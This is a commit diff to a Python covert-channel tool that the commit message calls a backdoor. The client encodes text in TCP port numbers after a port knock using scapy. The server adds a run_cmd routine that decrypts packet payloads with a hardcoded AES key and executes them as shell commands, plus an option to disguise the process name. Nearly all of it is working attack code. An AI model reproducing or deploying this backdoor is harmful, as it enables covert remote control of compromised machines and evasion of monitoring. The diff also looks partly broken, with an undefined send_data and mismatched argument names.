68af48ab035983ac6141d0f6c49a715c06b78736
Hakus <altenotiz@gmail.com>
2015-11-25 16:01:32 -0800

    Updated covert channel with backdoor

--- client.py
+++ client.py
@@ -4,26 +4,39 @@ import logging
 from random import uniform, randint
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
+from Crypto.Cipher import AES
+MASTER_KEY = "CorrectHorseBatteryStapleGunHead"
+
+
+def encrypt_val(text):
+    secret = AES.new(MASTER_KEY)
+    tag_string = (str(text) + (AES.block_size - len(str(text)) % AES.block_size) * "\0")
+    cipher_text = base64.b64encode(secret.encrypt(tag_string))
+    return cipher_text
+
+
+def decrypt_val(cipher):
+    secret = AES.new(MASTER_KEY)
+    decrypted = secret.decrypt(base64.b64decode(cipher))
+    result = decrypted.rstrip("\0")
+    return result
+
+
+def verify_root():
+    if(os.getuid() != 0):
+        exit("This program must be run with root/sudo")
 
 
 def char_packet(dest, char1, char2=None):
-    timeVar = time.gmtime().tm_min * time.gmtime().tm_hour
     if(char2 is None):
         destport = ord(char1) << 8
     else:
         destport = (ord(char1) << 8) + ord(char2)
-    destport = (destport ^ timeVar)
-    return IP(dst=dest) / TCP(sport=get_srcport(), dport=destport, flags="S")
-
-
-def port_packet(dest, destport, srcport=80):
-    global args
     return IP(dst=dest) / TCP(sport=get_srcport(), dport=destport, flags="S")
 
 
 def get_srcport():
-    global args
-    if(args.srcport is None):
+    if(args.sport is None):
         return 80
     elif(args.srcport == "random"):
         return randint(1500, 65535)
@@ -31,13 +44,10 @@ def get_srcport():
         return int(args.srcport)
 
 
-def knock(dest):
-    timeVar = time.gmtime().tm_min * time.gmtime().tm_hour
-    sr1(port_packet(dest, 2525 + timeVar))
-    delay_sleep()
-    sr1(port_packet(dest, 14156 + timeVar))
-    delay_sleep()
-    sr1(port_packet(dest, 6364 + timeVar))
+def knock(destIP, ports):
+    for port in ports:
+        packet = IP(dst=destIP) / TCP(dport=port)
+        send(packet)
 
 
 def disconnect(dest):
@@ -48,10 +58,9 @@ def disconnect(dest):
 
 
 def end_msg(dest):
-    timeVar = time.gmtime().tm_min * time.gmtime().tm_hour
     randPort = randint(1500, 65535)
-    packet = IP(dst=dest, id=timeVar) / TCP(dport=randPort, sport=get_srcport())
-    sr1(packet)
+    packet = IP(dst=dest, id=42424) / TCP(dport=randPort, sport=get_srcport())
+    send(packet)
 
 
 def delay_sleep():
@@ -71,28 +80,29 @@ def delay_sleep():
         sys.exit("Invalid input for delay")
 
 
-def main(args):
-    dest = args.destIP
-    knock(dest)
+def main():
+    verify_root()
+    ports = [2525, 14156, 6364]
+    knock(args.destIP, ports)
+
     while True:
         msg = raw_input('Send: ')
         for char1, char2 in zip(msg[0::2], msg[1::2]):
             delay_sleep()
-            sr1(char_packet(dest, char1, char2))
+            send(char_packet(args.destIP, char1, char2))
         if(len(msg) % 2):
             delay_sleep()
-            sr1(char_packet(dest, msg[len(msg) - 1]))
-        end_msg(dest)
+            send(char_packet(args.destIP, msg[len(msg) - 1]))
+        end_msg(args.destIP)
 
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser("Python covert channel")
+    parser = argparse.ArgumentParser("Python Covert Application")
     parser.add_argument('destIP', help="Destination address")
-    parser.add_argument('-s', '--srcport', help="Source port, defaults to 80")
+    parser.add_argument('-s', '--sport', help="Source port to send from, defaults to 80")
     parser.add_argument('-d', '--delay', help="Delay between each send in seconds. Range allowed with a dash")
     args = parser.parse_args()
     try:
-        main(args)
+        main()
     except KeyboardInterrupt:
-        print("Disconnecting...")
-        disconnect(args.destIP)
+        exit("Ctrl+C received. Exiting...")
--- server.py
+++ server.py
@@ -1,64 +1,90 @@
-import sys
 import time
+import base64
+import argparse
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
+from subprocess import *
+from Crypto.Cipher import AES
+CONN_IPS = {}
+MASTER_KEY = "CorrectHorseBatteryStapleGunHead"
+
+
+def encrypt_val(text):
+	secret = AES.new(MASTER_KEY)
+	tag_string = (str(text) + (AES.block_size - len(str(text)) % AES.block_size) * "\0")
+	cipher_text = base64.b64encode(secret.encrypt(tag_string))
+	return cipher_text
+
+
+def decrypt_val(cipher):
+	secret = AES.new(MASTER_KEY)
+	decrypted = secret.decrypt(base64.b64decode(cipher))
+	result = decrypted.rstrip("\0")
+	return result
+
+
+def verify_root():
+	if(os.getuid() != 0):
+		exit("This program must be run with root/sudo")
+
+
+def run_cmd(packet):
+	data = packet['Raw'].load
+	data = decrypt_val(data)
+	output = []
+	try:
+		command, arguments = data.split(' ', 1)
+	except ValueError:
+		arguments = None
+	try:
+		if(arguments is not None):
+			out, err = Popen([command, arguments], stdout=PIPE, stderr=PIPE).communicate()
+		else:
+			out, err = Popen(data, stdout=PIPE, stderr=PIPE).communicate()
+	except OSError:
+		output = "Invalid Command / Command not found"
+	if(out):
+		output.append(out)
+	if(err):
+		output.append(err)
+	output = encrypt_val("".join(output))
+	time.sleep(0.1)
+	send_data(packet[1].src, packet[2].sport, output)
 
 
 def decode(packet):
-    timeVar = time.gmtime().tm_min * time.gmtime().tm_hour
-    if(packet[1].id == timeVar):
-        sys.stdout.write('\n')
-        return
-    dport = packet[2].dport
-    dport = (dport ^ timeVar)
-    char1 = chr((dport >> 8) & 0xff)
-    char2 = chr(dport & 0xff)
-    if(char2 is not None):
-        sys.stdout.write("{}{}".format(char1, char2))
-    else:
-        sys.stdout.write("{}".format(char1))
-    sys.stdout.flush()
+	if(packet[1].id == 42424):
+		sys.stdout.write('\n')
+		return
+	dport = packet[2].dport
+	char1 = chr((dport >> 8) & 0xff)
+	char2 = chr(dport & 0xff)
+	if(char2 is not None):
+		sys.stdout.write("{}{}".format(char1, char2))
+	else:
+		sys.stdout.write("{}".format(char1))
+	sys.stdout.flush()
 
 
 def parse(packet):
-    global connecting_ips
-    connIP = packet[1].src
-    destport = packet[2].dport
-    timeVar = time.gmtime().tm_min * time.gmtime().tm_hour
-    knock1 = 2525 + timeVar
-    knock2 = 14156 + timeVar
-    knock3 = 6364 + timeVar
-    dc1 = 13098 + timeVar
-    dc2 = 11514 + timeVar
-
-    if(connIP in connecting_ips):
-        if(connecting_ips[connIP] == 3):
-            if(destport == dc1):
-                connecting_ips[connIP] = 4
-                return
-            decode(packet)
-        elif(destport not in [knock2, knock3, dc2]):
-            del connecting_ips[connIP]
-        elif(destport == knock2 and connecting_ips[connIP] == 1):
-            connecting_ips[connIP] = 2
-        elif(destport == knock3 and connecting_ips[connIP] == 2):
-            print("Receiving message from {}".format(connIP))
-            connecting_ips[connIP] = 3
-        elif(destport == dc2 and connecting_ips[connIP] == 4):
-            del connecting_ips[connIP]
-            print("{} has disconnected".format(connIP))
-        else:
-            del connecting_ips[connIP]
-    elif(destport == knock1):
-        connecting_ips[connIP] = 1
+	if(packet[1].src == "192.168.0.18"):
+		decode(packet)
 
 
 def main():
-    print("Sniffing for traffic...")
-    sniff(filter="tcp", prn=parse)
+	print("Sniffing for traffic...")
+	sniff(filter="tcp", iface=args.iface, prn=parse)
 
 
 if __name__ == '__main__':
-    connecting_ips = {}
-    main()
+	connecting_ips = {}
+	verify_root()
+	parser = argparse.ArgumentParser("Python backdoor server")
+	parser.add_argument("-p", "--pname", help="Disguise process title")
+	parser.add_argument("-i", "--iface", help="Interface to sniff packets on")
+	args = parser.parse_args()
+	try:
+		main()
+	except KeyboardInterrupt:
+		exit("Ctrl+C received. Exiting...")
